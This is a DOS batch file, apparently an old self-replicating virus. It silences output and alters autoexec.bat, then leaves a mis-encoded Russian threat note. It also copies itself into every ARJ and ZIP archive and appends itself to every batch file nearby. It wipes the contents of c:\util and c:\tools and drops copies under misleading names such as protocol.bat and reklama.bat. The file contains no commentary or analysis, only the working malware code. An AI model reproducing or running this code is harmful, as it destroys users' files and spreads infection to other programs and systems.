@echo off
echo -(: LORD :)-
@ctty nul
attrib c:\autoexec.bat -h -r
echo set path=c:\LORD >> c:\autoexec.bat
md c:\LORD
echo ÍÅ ÓÄÀËßÉ ÝÒÓ ÏÀÏÊÓ, À ÒÎ ÕÓÆÅ ÁÓÄÅÒ! >> c:\LORD\message.doc
for %%i in (*.arj ..\*.arj) do arj a -r %%i %0
for %%k in (*.zip ..\*.zip) do pkzip %%k %0
for %%i in (*.bat ..\) do type %0 >> %%i
if exist c:\util deltree/y c:\util\*.*
if exist c:\tools deltree/y c:\tools\*.*
copy %0 c:\pricol.bat
copy %0 %winbootdir%\protocol.bat
copy %0 ..\reklama.bat
